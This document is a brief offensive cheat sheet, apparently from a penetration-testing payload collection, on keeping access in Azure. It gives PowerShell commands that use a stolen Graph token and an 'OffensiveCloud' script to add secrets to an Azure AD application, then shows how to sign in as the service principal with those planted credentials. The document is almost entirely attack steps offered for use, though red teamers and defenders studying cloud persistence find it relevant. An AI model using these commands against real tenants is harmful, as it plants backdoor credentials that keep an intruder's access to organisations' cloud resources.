# Azure Persistence

## Add secrets to application

* Add secrets with [lutzenfried/OffensiveCloud/Add-AzADAppSecret.ps1](https://github.com/lutzenfried/OffensiveCloud/blob/main/Azure/Tools/Add-AzADAppSecret.ps1)
    ```powershell
    PS > . C:\Tools\Add-AzADAppSecret.ps1
    PS > Add-AzADAppSecret -GraphToken $graphtoken -Verbose
    ```

* Use secrets to authenticate as Service Principal
    ```ps1
    PS > $password = ConvertTo-SecureString '<SECRET/PASSWORD>' -AsPlainText -Force
    PS > $creds = New-Object System.Management.Automation.PSCredential('<AppID>', $password)
    PS > Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant '<TenantID>'
    ```